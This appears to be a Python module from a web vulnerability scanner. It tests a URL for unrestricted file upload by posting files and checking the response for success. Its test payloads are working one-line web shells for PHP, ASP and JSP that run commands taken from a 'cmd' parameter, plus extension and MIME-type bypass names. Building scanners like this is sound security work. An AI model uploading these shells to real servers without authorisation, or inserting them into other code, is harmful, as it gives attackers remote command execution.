from typing import Dict, List
import io
from core.request_handler import RequestHandler

class FileUploadScanner:
    def __init__(self):
        self.request_handler = RequestHandler()
    
    def scan(self, url: str) -> List[Dict]:
        vulnerabilities = []
        test_files = [
            ('shell.php', b'<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('shell.php.jpg', b'<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
            ('shell.phtml', b'<?php system($_GET["cmd"]); ?>', 'application/x-httpd-php'),
            ('shell.php5', b'<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('shell.asp', b'<% eval request("cmd") %>', 'application/x-asp'),
            ('shell.aspx', b'<% eval request("cmd") %>', 'application/x-aspx'),
            ('shell.jsp', b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'application/x-jsp'),
        ]
        for filename, content, mime_type in test_files:
            files = {
                'file': (filename, io.BytesIO(content), mime_type)
            }
            try:
                response = self.request_handler.send_request(
                    url,
                    method='POST',
                    data=files
                )
                if response.get('status_code') == 200:
                    if 'upload' in response.get('content', '').lower() and 'success' in response.get('content', '').lower():
                        vulnerabilities.append({
                            'type': 'File Upload',
                            'url': url,
                            'filename': filename,
                            'severity': 'Critical',
                            'description': f'Dangerous file {filename} uploaded successfully',
                            'evidence': 'File upload successful'
                        })
            except Exception:
                pass
        return vulnerabilities